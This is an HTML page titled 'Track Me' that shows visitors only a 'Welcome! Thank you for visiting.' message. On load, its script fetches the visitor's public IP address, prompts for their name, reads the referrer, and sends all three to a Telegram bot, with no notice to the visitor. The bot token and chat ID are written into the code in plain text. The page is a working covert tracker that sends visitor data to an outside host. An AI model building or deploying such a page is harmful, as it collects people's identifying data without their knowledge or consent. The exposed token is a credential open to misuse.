<!DOCTYPE html>
<html>
<head>
    <title>Track Me</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        h1, p {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 10px;
        }
    </style>
    <script>
        function track() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    var userName = prompt("Please enter your name:");
                    var location = document.referrer;
                    var data = 'IP: ' + ip + ', Name: ' + userName + ', Location: ' + location;
                    var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                    var chatId = '5410457102';
                    fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data
                        })
                    });
                });
        }
    </script>
</head>
<body onload="track()">
    <div>
        <h1>Welcome!</h1>
        <p>Thank you for visiting.</p>
    </div>
</body>
</html>
